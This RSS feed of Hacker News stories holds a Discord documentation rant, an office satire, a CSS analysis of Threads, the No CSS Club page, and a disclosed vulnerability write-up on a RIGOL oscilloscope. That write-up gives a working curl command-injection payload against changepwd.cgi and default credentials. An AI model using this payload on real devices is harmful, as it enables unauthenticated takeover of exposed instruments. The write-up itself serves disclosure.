<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sun, 16 Jul 2023 16:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Discord Is Not Documentation (215 pts)]]></title>
            <link>https://shkspr.mobi/blog/2023/07/discord-is-not-documentation/</link>
            <guid>36746154</guid>
            <pubDate>Sun, 16 Jul 2023 12:20:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://shkspr.mobi/blog/2023/07/discord-is-not-documentation/">https://shkspr.mobi/blog/2023/07/discord-is-not-documentation/</a>, See on <a href="https://news.ycombinator.com/item?id=36746154">Hacker News</a></p>
<div id="readability-page-1" class="page"><article itemscope="" itemprop="blogPost"><div itemprop="https://schema.org/articleBody">
<p>I'm going to be slightly contrarian and say that I <em>like</em> Discord. It's great to be able to get real-time help on a problem. And it is fun to see, again in real-time, what other people are working on and struggling with.</p><p>In truth, Discord is no harder to sign up to than Slack, Matrix, Gitter, IRC, or whatever. And of course Open Source projects will follow the maxim of "go where your audience are". There's no point posting everything to MySpace when everyone's already on Facebook.</p><p>Do I care that Discord isn't open source? Well, kinda. But I can open it in Firefox and it works just fine.</p><p>Discord is perfect for <em>ephemeral</em> communications.</p><p>But it is not a fucking substitute for documentation!</p><p>I'm currently getting started, and increasingly frustrated, with the <a href="https://watchy.sqfmi.com/">Watchy</a> development platform. They've effectively said "here's a barebones guide to setting it up - anything else, ask on Discord" - and it fucking sucks.</p><p>There's no API documentation - I have to scroll through a million messages to find anything.</p><p>I can't use search, because people don't know how to thread. So I can see questions but not replies.</p><p>When I do find replies, it's hard to know how relevant they are.  A typical Discord chat looks like:</p><ul><li>Alice: What's the command to go fullscreen?</li><li>Bob: Anyone know how I irrevocably format my disk without confirmation?</li><li>Carol: Oh, yeah, it's easy. Just pass the <code>-f</code> flag.</li></ul><p>Errrr...</p><p>And then you get the people who get snippy with newbie for asking a question which is frequently seen!  So infuriating.</p><p>I'm not necessarily advocating for <a href="https://documentation.divio.com/">the Four-Document Model</a> - which has <a href="https://www.hillelwayne.com/post/problems-with-the-4doc-model/">some critics</a> - but I just don't understand why wouldn't at least collate all of the common questions and put the answers in one place.</p><p>Look, writing a FAQ is probably not the right way to approach comprehensive documentation. But if you can't even be bothered to do that, perhaps you shouldn't be releasing a product in the first place?</p><p>/rant</p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[It Takes 6 Days to Change 1 Line of Code (202 pts)]]></title>
            <link>https://edw519.posthaven.com/it-takes-6-days-to-change-1-line-of-code</link>
            <guid>36746014</guid>
            <pubDate>Sun, 16 Jul 2023 12:01:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://edw519.posthaven.com/it-takes-6-days-to-change-1-line-of-code">https://edw519.posthaven.com/it-takes-6-days-to-change-1-line-of-code</a>, See on <a href="https://news.ycombinator.com/item?id=36746014">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post_body_931711">
<p>(A true story.)</p>
<p>Philip (President): Our factory is underutilized by 10%. Either we start building more of our backlog or we lay people off. I'd rather keep everyone busy, build inventory, and get ahead of the curve before the busy season. How can we do that?</p>
<p>Lee (Operations Manager): Company policy restricts us from building more than 3 months of backlog. If you just change that to 4 months, we'll have plenty of work.</p>
<p>Philip: Done. Now how do we implement that?</p>
<p>Lee: I'm not really sure. I think we'd have to change a setting in the legacy software.</p>
<p>David (IT Director): No problem. It's probably one line of code in our core routine. Fill out a ticket and submit it to IT Services.</p>
<p>Judy (IT Admin): I'm assigning this request Ticket# 129281. But it still needs the section on Business Impact completed and Director approval.</p>
<p>David: It's for Philip. It we don't do this right away, we'll have to have a layoff.</p>
<p>Judy: OK, then I'll fill out that section myself and put this on the fast track.</p>
<p>2 days later.</p>
<p>David: What's the status of 129281?</p>
<p>Judy: It's the first Enhancement in the Developer Queue, after 14 Bug Reports.</p>
<p>David: Forget the queue. Mark it urgent and send it to Ed immediately.</p>
<p>1 hour later.</p>
<p>Ed (programmer): On line 1252 of Module ORP572, I changed the hard-coded variable MonthsOfBacklog from "3" to "4". I unit tested this successfully and ran 2 batch test runs. The Operations work queue increased 10% as expected. This is good to go. I just submitted it to Code Review and moved in to Homer for User Acceptance Testing.</p>
<p>Shirley (Code Review): It is now against company policy to have any hard-coded variables. You will have to make this a record in the Parameters file. Also, there are 2 old Debug commands, an unassigned variable warning message, and a hard-coded Employee ID that will all have to be fixed before this module can be moved to production.</p>
<p>Ed: Fuck that shit.</p>
<p>Shirley: That may very well be true. But since you were assigned ORP572, you are responsible for fixing preexisting errors that violate new company policy. I cannot promote this as it is.</p>
<p>2 hours later.</p>
<p>Ed: OK, done. I just resubmitted it to Code Review.</p>
<p>Julie (IT Testing): Homer is not available for User Acceptance Testing because Fred is running a controlled test for month-end accounting close. Use Marge instead.</p>
<p>Ed: I don't have access to Marge.</p>
<p>Julie: Then contact Joe in IT Security. He'll get you permissions.</p>
<p>2 hours later.</p>
<p>Joe (IT Security): I cannot grant you access to Marge without David's signature. He's out of town. Can this wait until Monday?</p>
<p>Ed: I don't think so. Philip wants this right away. Get him to grant access.</p>
<p>Shirley: Your new Parameters record "MonthsOfDemand" needs a better name. The offshore programmers won't understand what this means. Also, it should have an audit trail of changes.</p>
<p>Ed: What policy is that?</p>
<p>Shirley: It's not exactly written down anywhere. The offshore team is 3 months late updating the wiki, but I assure you, all new Parameter records must satisfy new naming requirements and keep audit trails.</p>
<p>1 day later:</p>
<p>Ed: I renamed the Parameters record "MonthsOfDemand" to "SelectedMonthsOfBacklogDemand" and added Module PAR634 to maintain that record and its audit trail. I have submitted it to Code Review.</p>
<p>Tony (IT Testing): I see 129281 on Marge, but I have no Test Plan.</p>
<p>Ed: Just run it the old way and the new way and note the increase in the total on the WorkOrdersHours report.</p>
<p>Tony: That's your test plan? No. This affects everything in the factory. I have to have user selected Test Cases, Expected Results, documented Test Runs, and user sign-off.</p>
<p>2 days later:</p>
<p>Philip: David, tell Tony to move Ed's program to production immediately.</p>
<p>David: Yes sir.</p>
<p>Total elapsed time: 6 days.<br>Lines of mission critical code changed: 1.<br>Bytes of mission critical code changed: 1.<br>Excedrin eaten: 24<br>Pissed off hours spent on Hacker News: 14.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Unauthenticated RCE on a RIGOL oscilloscope (121 pts)]]></title>
            <link>https://tortel.li/post/insecure-scope/</link>
            <guid>36745664</guid>
            <pubDate>Sun, 16 Jul 2023 11:13:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tortel.li/post/insecure-scope/">https://tortel.li/post/insecure-scope/</a>, See on <a href="https://news.ycombinator.com/item?id=36745664">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><p>I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.</p>
<p>One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!</p>
<p><img src="https://tortel.li/rigol_web_control.png" alt=""></p>
<p>I was super curious so I decided to try and (digitally) crack it open. I headed to the <a href="https://www.rigolna.com/firmware/">vendor firmware downloads page</a>, selected the MSO5000 firmware and waited for my browser to complete the download.</p>
<p>The downloaded file ends in .GEL, and I have never seen that extension before. <code>file</code> thinks it’s a tar archive, so let’s try to use <code>binwalk -e</code> and extract what’s inside.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>$ tree --charset=ascii .
</span></span><span><span>.
</span></span><span><span>`-- _DS5000Update.GEL.extracted
</span></span><span><span>    |-- 0.tar
</span></span><span><span>    |-- app.img.gz
</span></span><span><span>    |-- fw4linux.sh
</span></span><span><span>    |-- fw4uboot.sh
</span></span><span><span>    |-- logo.hex.gz
</span></span><span><span>    |-- system.img.gz
</span></span><span><span>    `-- zynq.bit.gz
</span></span><span><span>
</span></span><span><span>1 directory, 7 files
</span></span></code></pre></div><p>The <code>app.img.gz</code> looked intersting and after extraction, in fact turned out containing the binaries for the web control application.</p>
<p>After extracting the <code>app.img.gz</code> with <code>p7zip</code>, I used <code>binwalk -e</code> again (it actually asked to install <a href="https://github.com/jrspruitt/ubi_reader">this tool</a> before allowing me to extract the files) and this was the resulting folder.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>$ tree --charset=ascii -L 2 .
</span></span><span><span>.
</span></span><span><span>`-- app
</span></span><span><span>    |-- appEntry
</span></span><span><span>    |-- cups
</span></span><span><span>    |-- default
</span></span><span><span>    |-- drivers
</span></span><span><span>    |-- K160M_TOP.bit
</span></span><span><span>    |-- mail
</span></span><span><span>    |-- Qt5.5
</span></span><span><span>    |-- resource
</span></span><span><span>    |-- shell
</span></span><span><span>    |-- tools
</span></span><span><span>    `-- webcontrol
</span></span><span><span>
</span></span><span><span>10 directories, 2 files
</span></span></code></pre></div><p>Hooray! The <code>webcontrol</code> folder looks promising. And in fact here there are all the files needed in order to launch the webcontrol application.</p>
<h2 id="lets-try-to-emulate-it">Let’s try to emulate it!</h2>
<p>We will use <code>qemu</code> and <code>chroot</code> in combination in order to emulate the oscilloscope software without having to brick a real oscilloscope.</p>
<p>But before tinkering with <code>qemu</code>, we need to have an exact copy of the internal memory of the oscilloscope, in order to have all the correct libraries installed.</p>
<p>Extract the <code>system.img</code> file we found before with <code>binwalk -e</code>. It will contain a file named <code>rootfs.img</code>, which is an ext2 image.</p>
<p>Mount and copy the rootfs image with <code>mkdir mount &amp;&amp; sudo mount rootfs.img mount/ &amp;&amp; cp -r mount rootfs &amp;&amp; sudo umount mount</code>. This should be the result.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>$ tree -L 1 --charset=ascii
</span></span><span><span>.
</span></span><span><span>|-- bin
</span></span><span><span>|-- checkapp
</span></span><span><span>|-- dev
</span></span><span><span>|-- etc
</span></span><span><span>|-- home
</span></span><span><span>|-- lib
</span></span><span><span>|-- licenses
</span></span><span><span>|-- linuxrc -&gt; bin/busybox
</span></span><span><span>|-- lost+found
</span></span><span><span>|-- media
</span></span><span><span>|-- mnt
</span></span><span><span>|-- opt
</span></span><span><span>|-- proc
</span></span><span><span>|-- rigol
</span></span><span><span>|-- root
</span></span><span><span>|-- sbin
</span></span><span><span>|-- sys
</span></span><span><span>|-- tmp
</span></span><span><span>|-- ubifs-util
</span></span><span><span>|-- user
</span></span><span><span>|-- usr
</span></span><span><span>`-- var
</span></span><span><span>
</span></span><span><span>20 directories, 2 files
</span></span></code></pre></div><p>Now, let’s try to emulate something with <code>qemu</code>, like a shell.</p>
<p>Make sure to install <code>qemu qemu-user-static binfmt-support</code>. If you’re using Ubuntu: <code>sudo apt install qemu qemu-user-static binfmt-support</code>.</p>
<p>Then copy <code>qemu-arm-static</code> to a place inside the rootfs, so when we <code>chroot</code> into the folder, it will be found.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo cp /usr/bin/qemu-arm-static ./rootfs/bin
</span></span></code></pre></div><p>Then use <code>sudo chroot . sh</code> to emulate a shell.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>~/rootfs 
</span></span><span><span>$ sudo chroot . sh
</span></span><span><span>/ # ls
</span></span><span><span>bin         home        lost+found  proc        sys         usr
</span></span><span><span>checkapp    lib         media       rigol       tmp         var
</span></span><span><span>dev         licenses    mnt         root        ubifs-util
</span></span><span><span>etc         linuxrc     opt         sbin        user
</span></span><span><span>/ # whoami
</span></span><span><span>root
</span></span><span><span>/ # uname -a
</span></span><span><span>Linux pwnOS 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 armv7l GNU/Linux
</span></span><span><span>/ # 
</span></span></code></pre></div><p>Perfect, we have a functioning rootfs. Let’s try to execute some RIGOL software. Copy the <code>/webcontrol</code> folder we found in the <code>app.img</code> file into <code>rootfs/rigol</code>, don’t copy it to the rootfs root, otherwise ld.so complains for some reason.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo cp -r ~/Downloads/osc/app/webcontrol ./rootfs/rigol
</span></span></code></pre></div><p>If we looked inside the <code>app.img</code> dump, we would have found a file named <code>app/shell/start.sh</code> that is responsible to launch the main components of the oscilloscope. In that file, we can see the part that launches the web control application.</p>
<div><pre tabindex="0"><code data-lang="plaintext"><span><span>############################################
</span></span><span><span>#Start webcontrol service
</span></span><span><span>############################################
</span></span><span><span>DATA_FILE=/rigol/data/user.conf
</span></span><span><span>if [ ! -f $DATA_FILE ]; then
</span></span><span><span>	cp /rigol/default/user.conf /rigol/data/
</span></span><span><span>	sync
</span></span><span><span>fi
</span></span><span><span>/rigol/webcontrol/sbin/lighttpd -f /rigol/webcontrol/config/lighttpd.conf &amp;
</span></span></code></pre></div><p><em>By default, the file <code>/rigol/default/user.conf</code> contains only
<code>admin:rigol</code> (which are the default credentials of the web application).Let’s create a new file <code>/rigol/webcontrol/config/user.conf</code> with <code>admin:rigol</code></em></p>
<p>Let’s try to launch the webcontrol!</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span><span># Let's use -D to avoid letting the server go in the background.</span>
</span></span><span><span>sudo chroot . /rigol/webcontrol/sbin/lighttpd -D -f /rigol/webcontrol/config/lighttpd.conf
</span></span></code></pre></div><p><img src="https://tortel.li/rigol_web_control_emulated.png" alt="The emulated web server, we did it!"></p>
<p>We did it! Since we now have a functioning RIGOL web control application, let’s start to look for bugs.</p>
<p>While I could have started anywhere, I was intrigued by the <code>cgi-bin</code> folder. I fired up my Ghidra instance and I loaded every <code>cgi-bin</code> entry into it.</p>
<p>After a bit of unsuccessful fiddling and checking for buffer uses (I was aiming for a memory corruption vulnerability), I found some strange stuff on <code>changepwd.cgi</code>.</p>
<p>Let’s load it on Ghidra.</p>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>This binary gets executed every time the user wants to change their password.</p>
<p>First of all we need to find the <code>main</code> function. Luckily, symbols are left intact in this, so we don’t have to guess too much. The main function is a little bit strange: turns out that this binary uses <a href="https://github.com/boutell/cgic">this library</a> to handle CGI programming in C.</p>
<p>As the project’s <code>README</code> <a href="https://github.com/boutell/cgic#how-to-write-a-cgic-application">says</a>, the developer’s custom code starts in the function <code>cgiMain()</code>. Let’s find it.</p>
<p><img src="https://tortel.li/changepwd-bin.png" alt="The disassembly"></p>
<p>The call to <code>system</code> looks super suspicious. The author basically wanted a quick way to write <code>admin:user_password</code> inside the <code>path</code> file (<code>/rigol/data/user.conf</code>). It does this by launching a shell and executing <code>echo admin:user_password &gt; /rigol/data/user.conf</code>.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>n <span>=</span> strlen(pass0);
</span></span><span><span>iVar2 <span>=</span> strncmp(saved_pwd,pass0,n);
</span></span><span><span><span>if</span> (iVar2 <span>==</span> <span>0</span>) {
</span></span><span><span>    sprintf(<span>&amp;</span>CMD_BUF,<span>"echo admin:%s &gt; %s"</span>,pass1,path);
</span></span><span><span>    system(<span>&amp;</span>CMD_BUF);
</span></span><span><span>    system(<span>"sync"</span>);
</span></span><span><span>    puts(<span>"OK"</span>);
</span></span><span><span>}
</span></span><span><span><span>else</span> {
</span></span><span><span>    puts(<span>"Old password is wrong"</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>If an attacker passing something like <code>; whoami # </code> as <code>pass1</code>, they could execute arbitrary commands on the underlying system.</p>
<p>But, in order to reach that command injection vulnerability we need to pass the <code>strncmp</code> check that checks <code>pass0</code> against the saved password.</p>
<p>As per the manual, the <code>int strncmp(const char s1, const char s2, size_t n)</code> function compares the first <code>n</code> characters of the two strings. It is a little less known that if <code>n</code> is 0, the result of the <code>strncmp</code> function is also 0.</p>
<p>Can we force <code>n</code> to be 0?</p>
<p>Yes, if we manage to control <code>pass0</code>. If we passed an empty <code>pass0</code>, the <code>strlen</code> function would return 0 and that 0 would get passed as the <code>n</code> parameter to the <code>strncmp</code> function, letting us bypass the check!</p>
<p>So, we need to check whether we actually control <code>pass0</code> and <code>pass1</code>. If we scroll up a little bit we find these two assignments.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>pcVar1 <span>=</span> (<span>char</span> <span>*</span>)read_item_value(<span>"pass0"</span>,<span>256</span>);
</span></span><span><span>strcpy(pass0,pcVar1);
</span></span><span><span>pcVar1 <span>=</span> (<span>char</span> <span>*</span>)read_item_value(<span>"pass1"</span>,<span>256</span>);
</span></span><span><span>strcpy(pass1,pcVar1);
</span></span></code></pre></div><p><code>read_item_value</code> is basically a wrapper around <a href="https://github.com/boutell/cgic#cgiFormString"><code>cgiFormString</code></a>. If we provide the <code>pass0</code> and <code>pass1</code> form values in our HTTP request, we’re set.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>char</span><span>*</span> <span>read_item_value</span>(<span>char</span><span>*</span> param,<span>int</span> size) {
</span></span><span><span>  <span>// cmd_str is a global allocated buffer.
</span></span></span><span><span><span></span>  memset(cmd_str,<span>0</span>,<span>0x100</span>);
</span></span><span><span>  cgiFormString(param,cmd_str,size);
</span></span><span><span>  <span>return</span> cmd_str;
</span></span><span><span>}
</span></span></code></pre></div><h2 id="the-exploit">The exploit</h2>
<p>So, in the end, we control everything! A simple <code>curl</code> command is enough to hack an RIGOL oscilloscope through the RIGOL Web Control, without being authenticated at all.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>curl http://localhost/cgi-bin/changepwd.cgi -d <span>"pass0="</span> -d <span>"pass1=; whoami; id; uname -a # "</span>
</span></span></code></pre></div><p><img src="https://tortel.li/exploit.png" alt="pwned"></p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>Vulnerability found, 11/8/22</li>
<li>Sent detailed PoC, 11/9/22</li>
<li>RIGOL says they would have contacted me with updates from R&amp;D, 11/9/22</li>
<li>Follow-up on the vulnerability, 1/25/23</li>
<li>RIGOL says they would reply in 2-3 days, 1/28/23</li>
<li>Full disclosure, 2/8/23</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Do not expose your RIGOL oscilloscopes to the internet.</p>
<h2 id="trivia">Trivia</h2>
<p>I also made <a href="https://github.com/havce/havceCTF/tree/master/scope">a CTF challenge</a> based on this vulnerability.</p>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[No CSS Club – because no JavaScript was not hardcore enough (157 pts)]]></title>
            <link>https://nocss.club/</link>
            <guid>36745314</guid>
            <pubDate>Sun, 16 Jul 2023 10:17:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nocss.club/">https://nocss.club/</a>, See on <a href="https://news.ycombinator.com/item?id=36745314">Hacker News</a></p>
<div id="readability-page-1" class="page">

<p>
The modern web is <strong>literally Satan and will probably eat your first-born
child if we don't do anything about it, and quick!</strong> (had to increase the
hyperbolism from <a href="https://1mb.club/">the</a>
<a href="https://512kb.club/">other</a>
<a href="https://250kb.club/">websites</a>; interestingly,
<a href="https://no-js.club/">the NoJS Club</a>, which until now has arguably
been the most radical of *.clubs, does not have much hyperbole, which really is
a shame).
</p>

<p>
To do what the Web was initally intended for (that is, make information
accessible via the Internet), all you need is to serve HTML documents. If you
need <em>"style"</em> that just means you're trying to cover up your lack of
interesting information.
</p>

<p>
Have *.club websites gone too far? Yes. If the author's own personal website
doesn't qualify for the list, that's a good sign of having gone too far. That
being said, please submit websites, your own or just interesting ones you like,
if they qualify for the rules below.
</p>

<h2>The Rules:</h2>

<ol>
    <li> No CSS (linked or in a <code>style</code> tag). </li>
    <li> No <code>style</code> attributes. </li>
    <li> No JavaScript. </li>
</ol>

<h2>Submitting:</h2>

<p>
<a href="mailto:m@m-chrzan.xyz">Email me</a> with "[NoCSS] <em>submitted
    URL</em>" in the subject line. If submitting multiple websites, you can list
them in the body instead. Feel free to include a short description, personal
anecdote, or joke in the email body as well. Make sure your email is sent as
<code>text/plain</code>, otherwise I will personally judge you.
</p>

<h2>The List:</h2>

<ul>
    <li> <a href="https://ipaddress.sh/">ipaddress.sh</a> </li>
    <li> <a href="http://info.cern.ch/"> info.cern.ch </a> </li>
    <li>
        <a href="https://www.bell-labs.com/usr/dmr/www/">
            Dennis M. Ritchie's website
        </a>
    </li>
    <li>
        <a href="https://pedantic.software/fxc/">
            François-Xavier Carton's website
        </a>
    </li>
    <li> <a href="https://cloudiums.pages.dev/">cloudiums.pages.dev</a> </li>
    <li> <a href="https://metamuffin.org/">metamuffin.org</a> </li>
    <li>
      <a href="https://thricegreat.neocities.org/">
        thricegreat.neocities.org
      </a>
    </li>
    <li>
      <a href="https://noneventivefeedback.neocities.org/">
        noneventivefeedback.neocities.org
      </a>
    </li>
    <li> <a href="https://shiver.asia/">shiver.asia</a> </li>
    <li> <a href="https://pvac.xyz/">pvac.xyz</a> </li>
    <li>
      <a href="https://kamnuandej.neocities.org/">
        kamnuandej.neocities.org
      </a>
    </li>
    <li> <a href="https://www.pilledtexts.com/"> pilledtexts.com </a> </li>
    <li> <a href="https://no-ht.ml/"> no-ht.ml </a> </li>
    <li>
      <a href="https://www.ocf.berkeley.edu/~abhishek/chicmath.htm">
        Chicago undergraduate mathematics bibliography
      </a>
    </li>
    <li> <a href="https://pad.js.org/"> pad.js.org </a> </li>
    <li> <a href="https://dimlight.org/"> dimlight.org </a> </li>
</ul>
</div>]]></description>
        </item>
        <item>
            <title><![CDATA[CSS Findings from the Threads App (156 pts)]]></title>
            <link>https://ishadeed.com/article/threads-app-css/</link>
            <guid>36745289</guid>
            <pubDate>Sun, 16 Jul 2023 10:13:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ishadeed.com/article/threads-app-css/">https://ishadeed.com/article/threads-app-css/</a>, See on <a href="https://news.ycombinator.com/item?id=36745289">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		
		<p>When I encounter a new product, one of the first things that comes to mind is how they implemented the CSS. This was no different when I came across Threads by Meta. I quickly explored the mobile app and noticed that I could preview public posts on the web.</p>

<p>This presented an opportunity for me to dig deeper. I came across a few interesting findings, which I will discuss in this article.</p>

<p>Let’s dive in!</p>

<h2 id="using-css-grid-for-the-post-layout">Using CSS grid for the post layout</h2>

<p>One of the most noteworthy use cases of CSS Grid in a production app is found in Threads. CSS Grid is used to build the post layout.</p>

<p>Take a look:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-layout.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>:root</span> <span>{</span>
  <span>--barcelona-threadline-column-width</span><span>:</span> <span>48px</span><span>;</span>
<span>}</span>

<span>.post</span> <span>{</span>
  <span>display</span><span>:</span> <span>grid</span><span>;</span>
  <span>grid-template-columns</span><span>:</span>
    <span>var</span><span>(</span><span>--barcelona-threadline-column-width</span><span>)</span>
    <span>minmax</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>fr</span><span>);</span>
  <span>grid-template-rows</span><span>:</span> <span>21px</span> <span>19px</span> <span>max-content</span> <span>max-content</span><span>;</span>
<span>}</span>
</code></pre></div>

<p><strong>Fun fact:</strong> the first grid column is named <code>--barcelona</code>. I’m curious to know the reason behind this choice.</p>

<p>The post layout consists of a 2-column * 4-row grid. There is no main container; each item within the post is manually placed using the <code>grid-column</code> and <code>grid-row</code> properties.</p>

<h3 id="the-user-avatar">The user avatar</h3>

<div><pre><code><span>.post-avatar</span> <span>{</span>
  <span>padding-top</span><span>:</span> <span>4px</span><span>;</span>
  <span>grid-row</span><span>:</span> <span>1</span> <span>/</span> <span>span</span> <span>2</span><span>;</span>
  <span>grid-column</span><span>:</span> <span>1</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>The avatar is positioned in the first column and spans the first two rows. It’s worth noting the presence of <code>padding-top</code>. Although I couldn’t find a specific reason for it in the production code, it seems to be fine-tuning the UI alignment.</p>

<p>Here is a <strong>before &amp; after</strong> look for an avatar with and without the <code>padding-top</code> treatment:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-avatar.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>The other reason for applying the <code>padding-top</code> here could be to push the avatar all the way down and make it closer to the line.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-avatar-2.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<h3 id="using-odd-values-for-the-grid-rows">Using odd values for the grid rows</h3>

<p>Why use <code>21px</code> and <code>19px</code> as row values? After inspecting further, it seems to be a form of fine-tuning for the UI. The sum of the row heights is <code>40px</code>, which accounts for the avatar height plus the <code>padding-top</code> (36px + 4px).</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-rows.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>You might be curious why these values are not standardized. Design systems are commonly associated with the belief that designers must strictly follow predefined rules for UI elements.</p>

<p>However, this example shows that using manually adjusted values can be acceptable. It’s okay to deviate from strict guidelines in certain situations.</p>

<h3 id="limitations-of-using-fixed-size-rows">Limitations of Using Fixed-Size Rows</h3>

<p>Due to the fixed widths of the first two rows, it’s not possible to add padding to them. Nevertheless, as long as you’re aware of this limitation, it can be worked around by using margins instead.</p>

<p>Here is an example:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-fixed-size-rows.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>Adding top and bottom padding didn’t affect the post header due to the fixed-size rows.</p>

<h3 id="the-space-between-the-layout-columns-feels-a-bit-hacky">The space between the layout columns feels a bit hacky</h3>

<p>The current gap between the layout columns is zero. Instead, the image has a size of <code>36*36</code> pixels, whereas its container is <code>48</code> pixels in width.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-spacing.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>This mimics the spacing here. I don’t know why the team opt-in for that, but I would prefer to use <code>gap</code> instead.</p>

<h3 id="why-not-use-named-css-grid-areas">Why not use named CSS grid areas?</h3>

<p>Based on what I’ve observed so far, there are three variations of the grid layout, and all of them could benefit from using named grid areas.</p>

<p>I tried to replicate the grid and build it based on the named areas. It looks easier to scan than specifying values for the columns and rows.</p>

<p>To demonstrate this, let’s assign a <code>grid-area</code> to each item in the layout:</p>

<div><pre><code><span>.AvatarContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>avatar</span><span>;</span>
<span>}</span>

<span>.HeaderContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>header</span><span>;</span>
<span>}</span>

<span>.BodyContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>body</span><span>;</span>
<span>}</span>

<span>.ThreadlineContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>line</span><span>;</span>
<span>}</span>

<span>.FooterContainer</span> <span>{</span>
  <span>grid-area</span><span>:</span> <span>footer</span><span>;</span>
<span>}</span>
</code></pre></div>

<h4 id="variation-1-the-default">Variation 1: the default</h4>

<p>Then, we can start working on the variations. Here is the default layout:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-area-1.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>.post</span> <span>{</span>
  <span>display</span><span>:</span> <span>grid</span><span>;</span>
  <span>grid-template-columns</span><span>:</span>
    <span>var</span><span>(</span><span>--barcelona-threadline-column-width</span><span>)</span>
    <span>minmax</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>fr</span><span>);</span>
  <span>grid-template-rows</span><span>:</span> <span>21px</span> <span>19px</span> <span>max-content</span> <span>max-content</span><span>;</span>
  <span>grid-template-areas</span><span>:</span>
    <span>"avatar header"</span>
    <span>"avatar body"</span>
    <span>". body"</span>
    <span>". footer"</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Note the use of <code>.</code> to represent empty spaces.</p>

<h4 id="variation-2-the-reply">Variation 2: the reply</h4>

<p>A variation is when someone replies to another.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-area-2.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>.post--reply</span> <span>{</span>
  <span>grid-template-rows</span><span>:</span> <span>36px</span> <span>0</span> <span>max-content</span> <span>max-content</span><span>;</span>
  <span>grid-template-areas</span><span>:</span>
    <span>"avatar header"</span>
    <span>"body body"</span>
    <span>"body body"</span>
    <span>"footer footer"</span><span>;</span>
<span>}</span>
</code></pre></div>

<h4 id="variation-3-the-default-with-a-thread-line">Variation 3: the default with a thread line</h4>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-area-3.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>.post--withLine</span> <span>{</span>
  <span>grid-template-areas</span><span>:</span>
    <span>"avatar header"</span>
    <span>"avatar body"</span>
    <span>"line body"</span>
    <span>"footer footer"</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Using named grid areas here made it possible to change the layout by editing in one place only.</p>

<h2 id="svg-for-the-thread-lines">SVG for the thread lines</h2>

<p>To be honest, what initially caught my attention in the Threads app was the swirl line. I became curious about how it was constructed since I had previously written about <a href="https://ishadeed.com/article/comment-component/">a similar topic</a> a few weeks ago.</p>

<p>See the following figure:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-line.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>That line connecting my avatar to Mark’s one is an SVG path. It consists of three parts.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-line-2.png" alt="">
    
    
